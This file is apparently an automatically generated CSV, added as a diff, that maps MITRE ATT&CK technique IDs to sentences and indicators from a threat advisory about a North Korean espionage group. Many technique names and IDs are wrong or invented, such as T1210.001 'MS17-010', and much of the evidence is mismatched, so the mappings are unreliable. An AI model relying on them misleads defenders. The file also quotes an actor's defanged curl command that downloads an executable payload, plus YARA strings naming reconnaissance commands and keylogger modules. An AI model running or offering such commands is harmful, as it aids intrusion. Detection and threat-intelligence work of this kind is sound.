@@ -1,0 +1,231 @@
+technique_id,technique_name,evidence,chunk,valid_id,evidence_found
+T1046,Network Service Scanning,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1047,Web Service,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1059.001,Spearphishing via Service,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1204.001,User Execution: Malware Delivery via Phishing,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1210,Exploit Public-Facing Application,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1212,Server Software Component,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1213,Web Server,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1214,User Execution: Malware Delivery by a Script,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,False,False
+T1215,Exploit Public-Facing Application: Drive-by Download,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,False,False
+T1216,Exploit Public-Facing Application: Drive-by Download Initial,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1217,Exploit Public-Facing Application: Drive-by Download Initial,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1218,Exploit Public-Facing Application: Drive-by Download Initial,"The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions.",0,True,False
+T1059.001,Execution through Web Shell,"The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j, to deploy a web shell and gain access to sensitive information and applications for further exploitation.",1,True,True
+T1053,Scheduled Task/Job,"The actors then employ standard system discovery and enumeration techniques, establish persistence using Scheduled Tasks,",1,True,True
+T1055,Process Injection,perform privilege escalation using common credential stealing tools such as Mimikatz,1,True,True
+T1210,Exploitation of Remote Services,"The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j,",1,True,True
+T1056,Query Registry,"The actors then employ standard system discovery and enumeration techniques,",1,True,True
+T1021,Remote Services,"The actors deploy and leverage custom malware implants, remote access tools (RATs), and open source tooling for execution, lateral movement, and data exfiltration.",1,True,True
+T1204,User Execution,"The actors also conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.",1,True,True
+T1057,Boot or System Services,"The actors deploy and leverage custom malware implants, remote access tools (RATs), and open source tooling for execution, lateral movement, and data exfiltration.",1,True,True
+T1041,Command and Control,"The actors deploy and leverage custom malware implants, remote access tools (RATs), and open source tooling for execution, lateral movement, and data exfiltration.",1,True,True
+T1005,Data Exfiltration,"The actors deploy and leverage custom malware implants, remote access tools (RATs), and open source tooling for execution, lateral movement, and data exfiltration.",1,True,True
+T1052,Input Validation,"The actors also conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.",1,True,True
+T1059.001,Command and Scripting Interpreter: PowerShell,"The actors currently target sensitive military information and intellectual property of defense, aerospace, nuclear, engineering organizations.",2,True,True
+T1059,Command and Scripting Interpreter,"The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities is satisfying collection",2,True,False
+T1041,Command and Control: Custom Command and Control Protocol,The authoring agencies assess the group has evolved from conducting destructive attacks targeting U.S. and South Korean organizations to conducting specialized cyber espionage and ransomware operations.,2,True,True
+T1566.002,Credential Dumping: DCSync,"The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities is satisfying collection",2,True,False
+T1056,Input Capture,"The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities is satisfying collection",2,True,False
+T1113,Brute Force,"The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities is satisfying collection",2,True,False
+T1056,Input Capture,"The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities is satisfying collection",2,True,False
+T1113,Brute Force,"The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities is satisfying collection",2,True,False
+T1041,Command and Control: Custom Command and Control Protocol,The authoring agencies assess the group has evolved from conducting destructive attacks targeting U.S. and South Korean organizations to conducting specialized cyber espionage and ransomware operations.,2,True,True
+T1059.001,Command and Scripting Interpreter: PowerShell,"The actors currently target sensitive military information and intellectual property of defense, aerospace, nuclear, engineering organizations.",2,True,True
+T1046,Network Service Scanning,The actors likely identify vulnerable systems using publicly available internet scanning tools that reveal information such as vulnerabilities in public-facing web servers,3,True,True
+T1047,Web Shell,None,3,True,False
+T1059,Command and Control,None,3,True,False
+T1059.001,Command and Control Server,None,3,True,False
+T1048,User Execution,None,3,True,False
+T1052,Input Validation,None,3,True,False
+T1053,Spoofing Identifiers,None,3,True,False
+T1055,Programmable Proxy,None,3,True,False
+T1056,Local Service Discovery,None,3,True,False
+T1057,Network Share Discovery,None,3,True,False
+T1058,System Information Discovery,None,3,False,False
+T1059.002,Command and Control: Standard Command and Control Protocol,None,3,True,False
+T1059.001,Command and Control (C2) Server,The tools allow the actors to maintain access to the victim system with each implant having a designated C2 node.,4,True,True
+T1059,Command and Control (C2) Server,The tools allow the actors to maintain access to the victim system with each implant having a designated C2 node.,4,True,True
+T1056,Input Capture,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) , .",4,True,True
+T1056.001,Input Capture: Keylogging,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) , .",4,True,True
+T1056.002,Input Capture: Screen Capture,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) , .",4,True,True
+T1056.003,Input Capture: File and Directory Listing,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) , .",4,True,True
+T1056.004,Input Capture: Browser History,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) , .",4,True,True
+T1056.005,Input Capture: Process Scheduling,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) , .",4,False,True
+T1056.006,Input Capture: File Creation and Writing,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) , .",4,False,True
+T1056.007,Input Capture: Network Connection Capture,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) , .",4,False,True
+T1056.008,Input Capture: File Upload,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) , .",4,False,True
+T1055,Process Injection,"These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) , .",4,True,True
+T1059.001,Command and Control: Standard Command and Control Protocol,The actors continue to breach organizations by exploiting web server vulnerabilities in public-facing devices and have conducted widespread activity against a number of different organizations simultaneously.,5,True,False
+T1059,Command and Control,"The actors use Windows command line, PowerShell, Windows Management Instrumentation command line (WMIC), and Linux bash for system, network, and account enumeration.",5,True,False
+T1059.002,Command and Control: Data Encrypted,Example commands used by the actors include the following: curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1059.003,Command and Control: Data Compressed,Example commands used by the actors include the following: curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1059.004,Command and Control: Data Obfuscated,Example commands used by the actors include the following: curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1059.005,Command and Control: Data Staged,Example commands used by the actors include the following: curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1059.006,Command and Control: Data Coded,Example commands used by the actors include the following: curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1059.007,Command and Control: Data Exfiltration,Example commands used by the actors include the following: curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1059.008,Command and Control: Data Transfer Size,Example commands used by the actors include the following: curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1059.009,Command and Control: Data Transfer Frequency,Example commands used by the actors include the following: curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1059.010,Command and Control: Data Transfer Size,Example commands used by the actors include the following: curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1059.011,Command and Control: Data Transfer Frequency,Example commands used by the actors include the following: curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\§users\§public\§notify[.]exe,5,True,False
+T1059.001,Steal or Forge Kerberos Tickets,The authoring agencies assess the actors change settings on compromised systems to force the system to store credentials and then use the aforementioned tools to steal credentials.,6,True,True
+T1059,Steal or Forge Kerberos Tickets,"The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump, and accessing the Active Directory domain database through targeting",6,True,True
+T1056,Input Capture,The actors were observed collecting registry hive data for offline extraction of credentials.,6,True,False
+T1082,System API/SDK Method Calling,The actors used customized file system enumeration tooling written in .NET.,6,True,True
+T1083,System Owner/User Discovery,The actors used customized file system enumeration tooling written in .NET.,6,True,True
+T1084,System Network Configuration Discovery,The actors used customized file system enumeration tooling written in .NET.,6,False,True
+T1085,System Information Discovery,The actors used customized file system enumeration tooling written in .NET.,6,False,True
+T1087,System Service Discovery,The actors used customized file system enumeration tooling written in .NET.,6,True,True
+T1089,System Network Connections Discovery,The actors used customized file system enumeration tooling written in .NET.,6,False,True
+T1047,Windows Management Instrumentation (WMI),The actors used customized file system enumeration tooling written in .NET.,6,True,True
+T1016,System Network Configuration Discovery,"The actors also enumerate directories and files of connected devices using Server Message Block (SMB) protocol, which enables network file sharing and the ability to request services and programs from a network.",6,True,False
+T1005,Data from Local System,"The actors log active window changes, clipboard data, and keystrokes and saves the collected logging information to the %Temp% directory.",6,True,False
+T1210,Exploit Public-Facing Application,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,True,True
+T1210.001,MS17-010,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,False,True
+T1210.002,MS15-034,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,False,True
+T1210.003,MS14-066,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,False,True
+T1210.004,MS13-050,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,False,True
+T1210.005,MS12-020,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,False,True
+T1210.006,MS11-050,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,False,True
+T1210.007,MS10-061,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,False,True
+T1210.008,MS09-050,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,False,True
+T1210.009,MS08-067,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,False,True
+T1210.010,MS07-018,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,False,True
+T1210.011,MS06-015,The actors disguise their malware within HTTP packets to appear as benign network traffic.,7,False,True
+T1059.001,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.002,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.003,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.004,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.005,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.006,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.007,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.008,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.009,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.010,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.011,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.012,Command and Control (C2) Server,The following include observed SHA-256 hashes:,8,True,True
+T1059.001,Command and Control (C2) Server,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0,9,True,True
+T1059.002,Command and Control (C2) Server,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",9,True,True
+T1059.003,Command and Control (C2) Server,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0,9,True,True
+T1059.003,Command and Control (C2) Server,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0,9,True,True
+T1059.003,Command and Control (C2) Server,Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0,9,True,True
+T1059.003,Command and Control (C2) Server,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0,9,True,True
+T1059.003,Command and Control (C2) Server,"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0",9,True,True
+T1059.003,Command and Control (C2) Server,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0),9,True,True
+T1059.003,Command and Control (C2) Server,Mozilla/5.0 (Windows NT 6.1; WOW64; x64; rv:52.0) Gecko/20100101 Firefox/52.0,9,True,False
+T1059.003,Command and Control (C2) Server,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:33.0) Gecko/20100101 Firefox/33.0,9,True,False
+T1059.001,Command and Control (C2) Server,condition: uint16(0) == 0x5A4D and $obfuscation1 and $obfuscation2 and $obfuscation3,10,True,True
+T1059.002,Command and Control (C2) Server,condition: uint16(0) == 0x5a4d and all of them,10,True,True
+T1059.003,Command and Control (C2) Server,condition: 3 of them,10,True,True
+T1059.004,Command and Control (C2) Server,condition: uint16(0) == 0x5A4D and $obfuscation1 and $obfuscation2 and $obfuscation3,10,True,True
+T1059.005,Command and Control (C2) Server,condition: uint16(0) == 0x5a4d and all of them,10,True,True
+T1059.006,Command and Control (C2) Server,condition: 3 of them,10,True,True
+T1059.007,Command and Control (C2) Server,condition: uint16(0) == 0x5A4D and $obfuscation1 and $obfuscation2 and $obfuscation3,10,True,True
+T1059.008,Command and Control (C2) Server,condition: uint16(0) == 0x5a4d and all of them,10,True,True
+T1059.009,Command and Control (C2) Server,condition: 3 of them,10,True,True
+T1059.010,Command and Control (C2) Server,condition: uint16(0) == 0x5A4D and $obfuscation1 and $obfuscation2 and $obfuscation3,10,True,True
+T1059.011,Command and Control (C2) Server,condition: uint16(0) == 0x5a4d and all of them,10,True,True
+T1059.012,Command and Control (C2) Server,condition: 3 of them,10,True,True
+T1059.001,Command and Control - Custom Command and Control Protocol,"B1 14 mov cl, 14h // C7 45 F7 14 00 41 00 mov [rbp+57h+Src], 410014h",11,True,True
+T1059.002,Command and Control - Custom Command and Control Protocol,"B9 8D 10 B7 F8 mov ecx, 0F8B7108Dh // E8 F1 BA FF FF call sub_140001280",11,True,True
+T1059.003,Command and Control - Custom Command and Control Protocol,B? 8D 10 B7 F8 E8,11,True,True
+T1059.003,Command and Control - Custom Command and Control Protocol,B? 91 B8 F6 88 E8,11,True,True
+T1059.003,Command and Control - Custom Command and Control Protocol,B? 8D 10 B7 F8 E8,11,True,True
+T1059.003,Command and Control - Custom Command and Control Protocol,B? 91 B8 F6 88 E8,11,True,True
+T1059.003,Command and Control - Custom Command and Control Protocol,B? 8D 10 B7 F8 E8,11,True,True
+T1059.003,Command and Control - Custom Command and Control Protocol,B? 91 B8 F6 88 E8,11,True,True
+T1059.003,Command and Control - Custom Command and Control Protocol,B? 8D 10 B7 F8 E8,11,True,True
+T1059.003,Command and Control - Custom Command and Control Protocol,B? 91 B8 F6 88 E8,11,True,True
+T1059.003,Command and Control - Custom Command and Control Protocol,B? 8D 10 B7 F8 E8,11,True,True
+T1059.003,Command and Control - Custom Command and Control Protocol,B? 91 B8 F6 88 E8,11,True,True
+T1059.001,Command and Control (C2) Server,Initiate a CMD session first.,12,True,True
+T1059.002,Command and Control (C2) Server,CMD is not open,12,True,True
+T1059.003,Command and Control (C2) Server,Couldn't write command,12,True,True
+T1059.004,Command and Control (C2) Server,Couldn't write to CMD: CMD not open,12,True,True
+T1059.005,Command and Control (C2) Server,Upload Error!,12,True,True
+T1059.006,Command and Control (C2) Server,ERROR: Downloading is already running!,12,True,True
+T1059.007,Command and Control (C2) Server,ERROR: Unable to open file:,12,True,True
+T1059.008,Command and Control (C2) Server,General error,12,True,True
+T1059.009,Command and Control (C2) Server,CMD error,12,True,True
+T1059.010,Command and Control (C2) Server,killing self,12,True,True
+T1059.001,Command and Control (C2) Server,"strings: $str_cmd_1 = ""/c net use \\",13,True,False
+T1059.002,Command and Control (C2) Server,"strings: $str_cmd_2 = ""/c ping -n 3 127.0.01 > NUL % echo EEE > ""%s""""",13,True,False
+T1059.003,Command and Control (C2) Server,"strings: $str_cmd_3 = ""/c move /y %s \\",13,True,False
+T1059.004,Command and Control (C2) Server,"strings: $str_cmd_4 = ""/c systeminfo > ""%s"" & tasklist > ""%s"" & netstat -naop tcp > ""%s""""",13,True,False
+T1059.005,Command and Control (C2) Server,"strings: $str_rdpconf = ""c: \windows\temp\RDPConf.exe""",13,True,False
+T1059.006,Command and Control (C2) Server,"strings: $str_rdpwinst = ""c: \windows\temp\RDPWInst.exe""",13,True,False
+T1059.007,Command and Control (C2) Server,"strings: $str_nopineapple = ""< No Pineapple! >""",13,True,True
+T1059.008,Command and Control (C2) Server,"strings: $str_qt_library = ""Qt 5.12.10""",13,True,False
+T1059.009,Command and Control (C2) Server,"strings: $str_mutex = ""MTX_Global""",13,True,True
+T1059.010,Command and Control (C2) Server,"strings: $m1 = "".?AVModuleKeyLogger@@""",13,True,True
+T1059.011,Command and Control (C2) Server,"strings: $m2 = "".?AVModulePortForwarder@@""",13,True,False
+T1059.012,Command and Control (C2) Server,"strings: $m3 = "".?AVModuleScreenCapture@@""",13,True,False
+T1059.001,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.002,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.003,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.004,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.005,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.006,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.007,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.008,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.009,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.010,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.011,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.012,Command and Control (C2) Server,"488b01 | mov edx, esi",14,True,True
+T1059.001,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.002,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.003,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.004,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.005,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.006,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.007,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.008,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.009,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.010,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.011,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.012,Command and Control: Data Encoded in Command,"488d0da0bd0000 | cmp eax, 0x57",15,True,True
+T1059.001,Command and Control (C2) Server,"e8???????? | // 83c414 | add esp, 0x14",16,True,True
+T1059.002,Command and Control (C2) Server,"e8???????? | // 83c404 | add esp, 4",16,True,True
+T1059.003,Command and Control (C2) Server,"e8???????? | // 83c408 | add esp, 8",16,True,True
+T1059.004,Command and Control (C2) Server,"e8???????? | // 83c410 | add esp, 0x10",16,True,True
+T1059.005,Command and Control (C2) Server,"e8???????? | // 83c414 | add esp, 0x14",16,True,True
+T1059.006,Command and Control (C2) Server,"e8???????? | // 83c404 | add esp, 4",16,True,True
+T1059.007,Command and Control (C2) Server,"e8???????? | // 83c408 | add esp, 8",16,True,True
+T1059.008,Command and Control (C2) Server,"e8???????? | // 83c410 | add esp, 0x10",16,True,True
+T1059.009,Command and Control (C2) Server,"e8???????? | // 83c414 | add esp, 0x14",16,True,True
+T1059.010,Command and Control (C2) Server,"e8???????? | // 83c404 | add esp, 4",16,True,True
+T1059.011,Command and Control (C2) Server,"e8???????? | // 83c408 | add esp, 8",16,True,True
+T1059.012,Command and Control (C2) Server,"e8???????? | // 83c410 | add esp, 0x10",16,True,True
+T1059.001,Command and Control: Data Encoded in Command,"52 | push edx $sequence_6 = { 8b4d0c 51 68???????? 8d9560eaffff 52 e8???????? } // n = 6, score = 300",17,True,True
+T1059.002,Command and Control: Data Encoded in Command,"52 | push edx $sequence_7 = { 83c001 8945f4 837df420 7d2c 8b4df8 } // n = 5, score = 300",17,True,False
+T1059.003,Command and Control: Data Encoded in Command,"52 | push edx $sequence_8 = { 83c001 89856cf6ffff 8b8d70f6ffff 8a11 } // n = 4, score = 300",17,True,False
+T1059.004,Command and Control: Data Encoded in Command,"52 | push edx $sequence_9 = { 0355f0 0fb602 0fb64df7 33c1 0fb655fc 33c2 } // n = 6, score = 200",17,True,False
+T1059.005,Command and Control: Data Encoded in Command,"52 | push edx $sequence_10 = { d1e9 894df8 8b5518 8955fc c745f000000000 } // n = 5, score = 200",17,True,False
+T1059.006,Command and Control: Data Encoded in Command,"52 | push edx $sequence_11 = { 8b4df0 3b4d10 0f8d90000000 8b5508 0355f0 0fb602 } // n = 6, score = 200",17,True,False
+T1059.001,Command and Control (C2) via Web Shell,Web shell malware is deployed,18,True,True
+T1059,Command and Control (C2),condition: 7 of them and filesize < 1736704,18,True,True
+T1059.002,Command and Control (C2) via Log4Shell,Log4Shell and Other Log4j Vulnerabilities,18,True,True
+T1059.001,Command and Control: Standard Command and Control Protocol,by adversaries on a victim’s web server to execute arbitrary system commands,19,True,True
+T1059,Command and Control,by adversaries on a victim’s web server to execute arbitrary system commands,19,True,True
+T1210,Exploit Public-Facing Application,Preventing exploitation of web-facing servers,19,True,True
+T1021,Remote Services,implementing multi-factor authentication for remote access services,19,True,True
+T1092,Web Shell,The NSA and Australian Signals Directorate’s report titled “Detect and Prevent Web Shell Malware”,19,True,True
+T1071,Application Layer Protocol,deploying and configuring Web Application Firewalls (WAFs),19,True,True
+T1090,Proxy,putting vulnerable or potentially risky systems behind reverse proxies that require authentication,19,True,True
+T1092.002,Web Shell: PHP Web Shell,The NSA and Australian Signals Directorate’s report titled “Detect and Prevent Web Shell Malware”,19,False,True
+T1056,Input Capture,Endpoint Activity Preventing and detecting further adversary activity should focus on deploying endpoint agents or other monitoring mechanisms,19,True,True
+T1056.001,Input Capture: Keylogging,Endpoint Activity Preventing and detecting further adversary activity should focus on deploying endpoint agents or other monitoring mechanisms,19,True,True
+T1056.002,Input Capture: Screen Capture,Endpoint Activity Preventing and detecting further adversary activity should focus on deploying endpoint agents or other monitoring mechanisms,19,True,True
+T1056.003,Input Capture: Audio Capture,Endpoint Activity Preventing and detecting further adversary activity should focus on deploying endpoint agents or other monitoring mechanisms,19,True,True
+T1059.001,Command and Control - Custom Command and Control Protocol,exploiting the TeamCity CVE-2023-42793 vulnerability,21,True,False
+T1059,Command and Control,targeting small and midsize businesses with H0lygh0st ransomware,21,True,False
+T1056,Exfiltration Over Command and Control Channel,the case of the curious C2,21,True,False
+T1052,Data Encrypted for Impact,H0lygh0st ransomware,21,True,False
+T1053,Spoofing,the curious C2,21,True,False
+T1055,Command and Control - Other Malicious Tool,the case of the curious C2,21,True,False
+T1057,Command and Control - Other Malicious Tool,the case of the curious C2,21,True,False
+T1058,Command and Control - Other Malicious Tool,the case of the curious C2,21,False,False
+T1059,Command and Control,the case of the curious C2,21,True,False
+T1059.002,Command and Control - Data Encrypted,the case of the curious C2,21,True,False
+T1059.003,Command and Control - Other Malicious Tool,the case of the curious C2,21,True,False
+T1059.004,Command and Control - Other Malicious Tool,the case of the curious C2,21,True,False
